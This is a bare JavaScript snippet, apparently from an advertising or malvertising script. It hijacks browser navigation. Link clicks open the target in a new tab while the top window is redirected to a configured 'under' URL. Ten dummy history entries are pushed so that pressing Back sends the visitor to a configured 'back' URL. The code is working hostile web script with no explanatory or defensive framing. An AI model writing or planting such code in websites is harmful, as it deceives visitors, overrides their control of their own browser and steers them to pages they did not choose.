if (typeof under !== "undefined" && under !== null) {
  if (typeof cta !== "undefined" && cta !== null) {
    document.addEventListener('click', function(event) {
      var target = event.target;
      while (target) {
        if (target.tagName === 'A' && target.classList.contains(cta)) {
          const linkHref = target.href;
          event.preventDefault();
          window.top.open(linkHref, '_blank');
          window.top.location.assign(under); // Redirect to top window location
          break;
        }
        target = target.parentNode;
      }
    });
  } else {
    document.addEventListener('click', function(event) {
      var target = event.target;
      while (target) {
        if (target.tagName === 'A') {
          const linkHref = target.href;
          event.preventDefault();
          window.top.open(linkHref, '_blank');
          window.top.location.assign(under); // Redirect to top window location
          break;
        }
        target = target.parentNode;
      }
    });
  }
}

if (typeof back !== "undefined" && back !== null) {
  !(function() {
    var t;
    try {
      const URL = window.location.href.split(/[#]/)[0];
      for (t = 0; t < 10; ++t)
        history.pushState({}, '', URL + '#');
      onpopstate = function(event) {
        event.state && window.top.location.assign(back); // Redirect to top window location
      };
    } catch (o) {
      console.log(o);
    }
  })();
}
